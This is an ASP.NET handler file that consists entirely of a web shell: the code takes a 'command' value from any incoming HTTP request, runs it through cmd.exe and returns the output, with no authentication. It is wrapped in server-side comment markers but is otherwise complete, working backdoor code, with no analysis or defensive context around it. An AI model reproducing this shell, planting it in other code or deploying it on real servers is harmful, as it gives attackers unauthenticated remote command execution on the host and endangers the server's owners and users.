<%--
<%@ WebHandler Language="C#" Class="CommandHandler" %>
using System.Diagnostics;
using System.Web;
public class CommandHandler : IHttpHandler {
 public void ProcessRequest(HttpContext requestContext) {
  string command = requestContext.Request["command"];
  Process child = new Process();
  child.StartInfo.FileName = "cmd.exe";
  child.StartInfo.UseShellExecute = false;
  child.StartInfo.RedirectStandardInput = true;
  child.StartInfo.RedirectStandardOutput = true;
  child.Start();
  child.StandardInput.WriteLine(command);
  child.StandardInput.Close();
  requestContext.Response.Write(child.StandardOutput.ReadToEnd());
 }
 public bool IsReusable { get { return false; } }
}

--%>
